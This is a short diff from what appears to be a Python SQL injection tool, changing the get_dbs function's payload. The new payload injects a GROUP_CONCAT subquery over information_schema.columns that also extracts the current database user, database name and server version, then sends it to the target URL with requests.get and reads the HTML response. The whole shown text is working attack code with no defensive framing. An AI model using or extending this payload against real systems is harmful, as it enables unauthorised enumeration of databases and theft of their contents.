@@ -126,7 +126,7 @@ def get_columns():
                                     print("Version : MySQL")
                                 
                                 def get_dbs():
-                                    payload_dbs = "(SELECT+GROUP_CONCAT(table_name,'..::..',column_name+SEPARATOR+'<br>')+FROM+information_schema.columns)"
+                                    payload_dbs = "(SELECT+GROUP_CONCAT(user(),' :: ',database(),' :: ',table_name,' :: ',column_name,' :: ',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                     query_id = re.sub(r'\b{}\b'.format(num), payload_dbs, payload)
                                     results_3 = requests.get(url +query_id)
                                     html = results_3.text
